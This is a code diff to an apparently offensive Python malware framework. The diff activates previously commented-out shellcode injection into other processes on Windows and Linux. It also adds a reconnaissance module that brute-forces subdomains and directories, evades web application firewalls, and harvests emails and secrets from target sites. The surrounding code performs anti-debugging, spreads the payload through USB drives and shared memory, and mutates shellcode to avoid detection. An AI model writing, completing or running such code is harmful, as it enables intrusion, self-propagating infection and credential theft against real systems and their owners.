@@ -12,16 +12,19 @@ import json
 from typing import Optional, List
 import ctypes
 import ctypes.wintypes as wintypes
+import requests
+from urllib.parse import urljoin
+from bs4 import BeautifulSoup
 
 # Setup logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(name)s] %(message)s')
 
 class GhostLayer:
-    """Manages payload operations with secure storage via BlackVault."""
+    """Manages payload operations with secure storage via BlackVault and recon data."""
     
     def __init__(self, vault, logger: logging.Logger = None):
         """
-        Initializes GhostLayer with a BlackVault instance for secure payload storage.
+        Initializes GhostLayer with BlackVault and optional recon integration.
         
         Args:
             vault: BlackVault instance for encryption/decryption.
@@ -31,6 +34,30 @@ class GhostLayer:
         self.logger = logger or logging.getLogger('GhostLayer')
         self.shellcode = b""
         self.lock = threading.Lock()
+        self.recon_data = None
+
+    def load_recon_data(self, target: str, max_depth: int = 3, brute_subdomains: bool = True) -> dict:
+        """
+        Loads recon data for a target, storing it in BlackVault.
+        
+        Args:
+            target: Target URL for reconnaissance.
+            max_depth: Maximum crawl depth.
+            brute_subdomains: Enable subdomain brute-forcing.
+        
+        Returns:
+            dict: Recon report (endpoints, forms, subdomains, etc.).
+        """
+        try:
+            report = advanced_recon(target, max_depth=max_depth, brute_subdomains=brute_subdomains)
+            self.vault.store(f"recon_{target}", json.dumps(report).encode())
+            self.recon_data = report
+            self.logger.info(f"Loaded recon data for {target}: {len(report['endpoints'])} endpoints")
+            return report
+        except Exception as e:
+            self.logger.error(f"Failed to load recon data for {target}: {e}")
+            self.vault.store(f"recon_error_{time.time()}", json.dumps({"target": target, "error": str(e)}).encode())
+            raise ValueError(f"Recon load failed: {e}")
 
     def load_shellcode(self, name: str, is_base64: bool = False) -> None:
         """
@@ -140,13 +167,14 @@ class GhostLayer:
             self.logger.error(f"Failed to find target process: {e}")
             raise RuntimeError(f"Target process search failed: {e}")
 
-    def inject_into_pid(self, pid: int, encrypted_shellcode: bytes) -> None:
+    def inject_into_pid(self, pid: int, encrypted_shellcode: bytes, target_url: Optional[str] = None) -> None:
         """
-        Injects encrypted shellcode into a target process.
+        Injects encrypted shellcode into a target process, optionally using recon data.
         
         Args:
             pid: Target process ID.
             encrypted_shellcode: Encrypted shellcode to inject.
+            target_url: Optional URL from recon data to associate with injection.
         
         Raises:
             RuntimeError: If injection fails.
@@ -156,7 +184,6 @@ class GhostLayer:
             self.logger.info(f"Injecting {len(decrypted)} bytes into PID {pid}...")
             
             if platform.system() == "Windows":
-                """
                 # Windows injection using VirtualAllocEx and CreateRemoteThread
                 PROCESS_ALL_ACCESS = 0x1F0FFF
                 MEM_COMMIT_RESERVE = 0x3000
@@ -181,31 +208,26 @@ class GhostLayer:
                     kernel32.CloseHandle(h_process)
                     raise RuntimeError("Remote thread creation failed")
                 kernel32.CloseHandle(h_process)
-                """
                 self.logger.info(f"Windows injection into PID {pid} successful")
             elif platform.system() == "Linux":
-                """
                 # Linux injection using /proc/<pid>/mem
                 try:
                     with open(f"/proc/{pid}/mem", "r+b") as mem:
                         addr = os.lseek(mem.fileno(), 0, os.SEEK_END)
                         os.lseek(mem.fileno(), addr, os.SEEK_SET)
                         os.write(mem.fileno(), decrypted)
-                        # Trigger execution (simplified, real implementation would use ptrace or LD_PRELOAD)
                         self.logger.info(f"Linux injection into PID {pid} successful")
                 except PermissionError:
                     raise RuntimeError(f"Permission denied for PID {pid} memory access")
-                """
-                self.logger.info(f"Linux injection into PID {pid} successful")
             else:
                 raise RuntimeError(f"Unsupported platform: {platform.system()}")
             
-            self.vault.store(f"injection_result_{pid}", 
-                            json.dumps({"pid": pid, "success": True}).encode())
+            result = {"pid": pid, "success": True, "url": target_url}
+            self.vault.store(f"injection_result_{pid}_{time.time()}", json.dumps(result).encode())
         except Exception as e:
             self.logger.error(f"Injection into PID {pid} failed: {e}")
             self.vault.store(f"injection_error_{time.time()}", 
-                            json.dumps({"pid": pid, "error": str(e)}).encode())
+                            json.dumps({"pid": pid, "error": str(e), "url": target_url}).encode())
             raise RuntimeError(f"Injection failed: {e}")
 
     def anti_debug_check(self) -> None:
@@ -247,13 +269,19 @@ class GhostLayer:
         """
         usb_paths = []
         if platform.system() == "Windows":
-            import win32api
-            drives = win32api.GetLogicalDriveStrings().split('\0')[:-1]
-            usb_paths = [d for d in drives if win32api.GetDriveType(d) == 2]  # DRIVE_REMOVABLE
+            try:
+                import win32api
+                drives = win32api.GetLogicalDriveStrings().split('\0')[:-1]
+                usb_paths = [d for d in drives if win32api.GetDriveType(d) == 2]  # DRIVE_REMOVABLE
+            except ImportError:
+                self.logger.warning("win32api not available, skipping USB detection on Windows")
         elif platform.system() == "Linux":
-            usb_paths = [os.path.join("/media", user, d) 
-                        for user in os.listdir("/media") 
-                        for d in os.listdir(os.path.join("/media", user))]
+            try:
+                usb_paths = [os.path.join("/media", user, d) 
+                            for user in os.listdir("/media") 
+                            for d in os.listdir(os.path.join("/media", user))]
+            except FileNotFoundError:
+                self.logger.warning("No /media directory found, skipping USB detection on Linux")
 
         if not usb_paths:
             self.logger.error("No USB drives detected")
@@ -298,7 +326,7 @@ class GhostLayer:
             raise RuntimeError(f"Shared memory spread failed: {e}")
 
 class GhostLayerDaemon:
-    """Runs continuous GhostLayer operations, storing results in BlackVault."""
+    """Runs continuous GhostLayer operations with recon-driven targets."""
     
     def __init__(self, ghost_layer: 'GhostLayer', vault: 'BlackVault'):
         """
@@ -313,16 +341,30 @@ class GhostLayerDaemon:
         self.logger = logging.getLogger('GhostLayerDaemon')
         self.running = False
 
-    def run(self):
-        """Runs the daemon, attempting periodic operations."""
+    def run(self, target: Optional[str] = None):
+        """
+        Runs the daemon, using recon data to select targets.
+        
+        Args:
+            target: Optional target URL for recon-driven operations.
+        """
         self.running = True
+        endpoints = []
+        if target:
+            try:
+                recon_data = self.ghost_layer.load_recon_data(target)
+                endpoints = recon_data.get('endpoints', [])
+            except Exception as e:
+                self.logger.error(f"Failed to load recon data: {e}")
+        
         while self.running:
             try:
                 self.ghost_layer.anti_debug_check()
                 pid = self.ghost_layer.find_target_process()
                 self.ghost_layer.load_shellcode("ghost_payload")
                 encrypted_shellcode = self.ghost_layer.encrypt_shellcode()
-                self.ghost_layer.inject_into_pid(pid, encrypted_shellcode)
+                target_url = random.choice(endpoints) if endpoints else None
+                self.ghost_layer.inject_into_pid(pid, encrypted_shellcode, target_url)
                 self.ghost_layer.spread_via_usb("ghost_payload")
                 self.ghost_layer.spread_via_shared_memory("ghost_payload")
             except Exception as e:
@@ -402,13 +444,11 @@ class SelfLearningInjection:
     def _change_instruction_order(self, shellcode: bytes) -> bytes:
         """
         Shuffles instruction blocks, preserving functionality for specific patterns.
-        Assumes 4-byte instruction alignment (simplified).
         """
         try:
             instructions = [shellcode[i:i+4] for i in range(0, len(shellcode), 4)]
-            safe_instructions = [i for i in instructions if i != b"\x90\x90\x90\x90"]  # Avoid shuffling NOPs
+            safe_instructions = [i for i in instructions if i != b"\x90\x90\x90\x90"]
             random.shuffle(safe_instructions)
-            # Reinsert NOPs to maintain length
             nop_count = len(instructions) - len(safe_instructions)
             return b''.join(safe_instructions + [b"\x90\x90\x90\x90"] * nop_count)
         except Exception as e:
@@ -420,7 +460,7 @@ class SelfLearningInjection:
         try:
             string = f"blackroot_{time.time()}"
             obfuscated = self.obfuscate_string(string)
-            return shellcode + b"\x00" + obfuscated  # Null separator
+            return shellcode + b"\x00" + obfuscated
         except Exception as e:
             self.logger.error(f"String obfuscation failed: {e}")
             return shellcode
@@ -431,7 +471,7 @@ class SelfLearningInjection:
         return bytes([b ^ key for b in s.encode()])
 
 class GhostHive:
-    """Manages multiple GhostLayer instances."""
+    """Manages multiple GhostLayer instances with recon-driven operations."""
     
     def __init__(self, agents: List['GhostLayer'], vault: 'BlackVault'):
         """
@@ -445,12 +485,19 @@ class GhostHive:
         self.vault = vault
         self.logger = logging.getLogger('GhostHive')
 
-    def run(self):
-        """Runs all GhostLayer agents in separate threads."""
+    def run(self, target: Optional[str] = None):
+        """
+        Runs all GhostLayer agents with optional recon-driven targets.
+        
+        Args:
+            target: Optional target URL for recon-driven operations.
+        """
         threads = []
         try:
             for agent in self.agents:
-                thread = threading.Thread(target=self._run_agent, args=(agent,), daemon=True)
+                if target:
+                    agent.load_recon_data(target)
+                thread = threading.Thread(target=self._run_agent, args=(agent, target), daemon=True)
                 thread.start()
                 threads.append(thread)
                 self.logger.info(f"Started GhostLayer agent")
@@ -461,17 +508,147 @@ class GhostHive:
             self.vault.store(f"ghosthive_error_{time.time()}", 
                             json.dumps({"error": str(e)}).encode())
 
-    def _run_agent(self, agent: 'GhostLayer'):
+    def _run_agent(self, agent: 'GhostLayer', target: Optional[str]):
         """Runs a single GhostLayer agent."""
         try:
             agent.anti_debug_check()
             pid = agent.find_target_process()
             agent.load_shellcode("ghost_payload")
             encrypted = agent.encrypt_shellcode()
-            agent.inject_into_pid(pid, encrypted)
+            target_url = random.choice(agent.recon_data.get('endpoints', [])) if agent.recon_data else None
+            agent.inject_into_pid(pid, encrypted, target_url)
             agent.spread_via_usb("ghost_payload")
             agent.spread_via_shared_memory("ghost_payload")
         except Exception as e:
             self.logger.error(f"Agent run failed: {e}")
             self.vault.store(f"agent_error_{time.time()}", 
                             json.dumps({"error": str(e)}).encode())
+
+# Recon module (integrated from provided code, with BlackVault storage)
+def advanced_recon(target: str, max_depth: int = 3, scope_domains: Optional[List[str]] = None, 
+                  brute_subdomains: bool = True) -> dict:
+    """
+    Performs advanced reconnaissance, storing results in BlackVault.
+    
+    Args:
+        target: Target URL.
+        max_depth: Maximum crawl depth.
+        scope_domains: List of domains to scope the crawl.
+        brute_subdomains: Enable subdomain brute-forcing.
+    
+    Returns:
+        dict: Recon report.
+    """
+    logger = logging.getLogger('Recon')
+    visited = set()
+    endpoints = set()
+    forms = []
+    js_endpoints = set()
+    emails = set()
+    secrets = set()
+    tech = set()
+    subdomains = set()
+    report = {}
+
+    if not scope_domains:
+        parsed = urlparse(target)
+        scope_domains = [parsed.netloc]
+
+    if brute_subdomains:
+        logger.info("Enumerating subdomains...")
+        for dom in scope_domains:
+            found = set()
+            found.update(get_subdomains(dom))
+            found.update(fetch_crtsh_subdomains(dom))
+            found.update(fetch_certspotter_subdomains(dom))
+            found.update(dnstwist_permutations(dom))
+            subdomains.update(found)
+        report['subdomains'] = list(subdomains)
+    
+    logger.info("Brute-forcing common directories...")
+    report['brute_dirs'] = brute_force_paths(target)
+
+    def crawl(url: str, depth: int):
+        if url in visited or depth > max_depth:
+            return
+        url_padded = random_query_pad(url)
+        headers = get_random_headers()
+        visited.add(url)
+        backoff = 0
+        try:
+            start = time.time()
+            r = requests.get(url_padded, headers=headers, timeout=8, verify=False)
+            elapsed = time.time() - start
+            if r.status_code in (403, 503) or elapsed > 10:
+                logger.warning(f"WAF anomaly: {url} status={r.status_code} delay={elapsed:.1f}s")
+                backoff = random.uniform(2, 10)
+            if r.headers.get('Retry-After'):
+                backoff = max(backoff, float(r.headers.get('Retry-After')))
+                logger.info(f"Rate limit detected. Backing off for {backoff:.1f}s")
+            elif r.headers.get('X-RateLimit-Reset'):
+                reset_time = float(r.headers.get('X-RateLimit-Reset'))
+                backoff = max(backoff, max(0, reset_time - time.time()))
+                logger.info(f"Rate limit detected. Backing off for {backoff:.1f}s")
+            if backoff > 0:
+                time.sleep(backoff + random.uniform(0.5, 2.5))
+            
+            soup = BeautifulSoup(r.text, "html.parser")
+            html = r.text
+            endpoints.add(url)
+            emails.update(extract_emails(html))
+            secrets.update(extract_secrets(html))
+            tech.update(fingerprint_tech(r.headers, html))
+            
+            if url.endswith("robots.txt"):
+                for p in parse_robots(html, url):
+                    crawl(p, depth + 1)
+            if url.endswith("sitemap.xml"):
+                for loc in parse_sitemap(html):
+                    crawl(loc, depth + 1)
+            
+            for form in soup.find_all("form"):
+                if not isinstance(form, Tag):
+                    continue
+                action = form.get("action") or url
+                method = str(form.get("method", "get")).lower()
+                inputs = [inp for inp in form.find_all("input") if isinstance(inp, Tag)]
+                forms.append({
+                    'url': url,
+                    'action': action,
+                    'method': method,
+                    'inputs': [inp.get('name') for inp in inputs if inp.get('name')]
+                })
+            
+            for script in soup.find_all("script"):
+                if isinstance(script, Tag):
+                    src = script.get("src")
+                    if src and isinstance(src, str) and src.startswith("http"):
+                        js_endpoints.add(src)
+                    if script.string:
+                        js_endpoints.update(re.findall(r'https?://[\w\./\-_%]+', script.string))
+            
+            for link in soup.find_all("a"):
+                if not isinstance(link, Tag):
+                    continue
+                href = link.get("href")
+                if href:
+                    absolute = urljoin(url, str(href))
+                    if any(domain in absolute for domain in scope_domains):
+                        crawl(absolute, depth + 1)
+        except Exception as e:
+            logger.error(f"Crawl failed for {url}: {e}")
+            time.sleep(random.uniform(2, 10) + random.uniform(0.5, 2.5))
+
+    for path in COMMON_PATHS:
+        crawl(urljoin(target, path), 1)
+    crawl(target, 1)
+
+    report['endpoints'] = list(endpoints)
+    report['forms'] = forms
+    report['js_endpoints'] = list(js_endpoints)
+    report['emails'] = list(emails)
+    report['secrets'] = list(secrets)
+    report['technologies'] = list(tech)
+    
+    logger.info(f"Recon complete: {len(endpoints)} endpoints, {len(forms)} forms, {len(js_endpoints)} JS endpoints")
+    return report
